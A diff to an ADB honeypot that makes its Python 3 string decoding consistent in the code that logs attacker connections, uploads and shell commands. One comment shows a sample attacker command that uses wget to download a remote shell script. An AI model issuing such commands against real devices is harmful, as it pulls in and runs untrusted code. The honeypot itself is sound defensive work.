@@ -186,11 +186,11 @@ class ADBConnection(threading.Thread):
         fp = os.path.join(DL_DIR, fn)
         logger.info('File uploaded: {}, name: {}, bytes: {}'.format(fp, f['name'], len(f['data'])))
         obj = {
-            'eventid': 'adbhoney.session.file_upload',
-            'src_ip': self.addr[0],
-            'shasum': sha256sum,
-            'outfile': fp,
-            'filename': f['name']
+            "eventid": "adbhoney.session.file_upload",
+            "src_ip": self.addr[0],
+            "shasum": sha256sum,
+            "outfile": fp,
+            "filename": f['name']
         }
         self.report(obj)
         #Don't overwrite the file if it already exists
@@ -240,11 +240,11 @@ class ADBConnection(threading.Thread):
             if prefix in parts[0]:
                 name_parts = parts[0].split(prefix)
                 if len(name_parts) == 1:
-                    f['name'] = name_parts[0]
+                    f['name'] = str(name_parts[0], "utf-8")
                 else:
-                    f['name'] = name_parts[1]
+                    f['name'] = str(name_parts[1], "utf-8")
             else:
-                f['name'] = parts[0]
+                f['name'] = str(parts[0], "utf-8")
             #filename = parts[0].split('\x00\x00\x00')[1]
 
         # if the message is really short, wrap it up
@@ -267,7 +267,7 @@ class ADBConnection(threading.Thread):
         
         #command will be 'shell:cd /;wget http://someresource.com/test.sh\x00'
         #Remove first six chars and last null byte.
-        cmd = message.data[6:-1]
+        cmd = str(message.data[6:-1], "utf-8")
         logger.info("shell command is {}, len {}".format(cmd, len(cmd)))
         if cmd in cmd_responses:
             response = cmd_responses[cmd]
@@ -281,29 +281,29 @@ class ADBConnection(threading.Thread):
         # also remove trailing \00
         logger.info('{}\t{}'.format(self.addr[0], message.data[:-1]))
         obj = {
-            'eventid': 'adbhoney.command.input',
-            'input': cmd,
-            'src_ip': self.addr[0],
+            "eventid": "adbhoney.command.input",
+            "input": cmd,
+            "src_ip": self.addr[0],
         }
         self.report(obj)
 
     def process_connection(self):
         start = time.time()
-        self.session = binascii.hexlify(os.urandom(6))
+        self.session = str(binascii.hexlify(os.urandom(6)), "utf-8")
         localip = socket.gethostbyname(socket.gethostname())
         logger.info('{} connection start ({})'.format(self.addr[0], self.session))
         obj = {
-            'eventid': 'adbhoney.session.connect',
-            'src_ip': self.addr[0],
-            'src_port': self.addr[1],
-            'dst_ip': localip,
-            'dst_port': CONFIG.get('honeypot', 'port'),
+            "eventid": "adbhoney.session.connect",
+            "src_ip": self.addr[0],
+            "src_port": self.addr[1],
+            "dst_ip": localip,
+            "dst_port": CONFIG.get('honeypot', 'port'),
         }
         self.report(obj)
 
         states = []
         self.sending_binary = False
-        f = {'name': '', 'data': ''}
+        f = {"name": "", "data": ""}
         filename = 'unknown'
         closedmessage = 'Connection closed'
         while True:
@@ -335,7 +335,7 @@ class ADBConnection(threading.Thread):
                 if len(states) >= 2 and states[-2:] == [protocol.CMD_WRTE, protocol.CMD_WRTE]:
                     logger.debug("Received Write/Write")
                     # last block of messages before the big block of data
-                    filename = message.data
+                    filename = str(message.data, "utf-8")
                     self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')
                     # why do I have to send the command twice??? science damn it!
                     self.send_twice(protocol.CMD_WRTE, 2, message.arg0, 'STAT\x07\x00\x00\x00')
@@ -356,7 +356,7 @@ class ADBConnection(threading.Thread):
                     self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')
                     if len(message.data) > 8:
                         self.send_twice(protocol.CMD_WRTE, 2, message.arg0, 'STAT\x01\x00\x00\x00')
-                        filename = message.data[8:]
+                        filename = str(message.data[8:], "utf-8")
                 elif states[-1] == protocol.CMD_OPEN and bytes('shell', "utf-8") in message.data:
                     logger.debug("Received shell command.")
                     self.recv_shell_cmd(message)
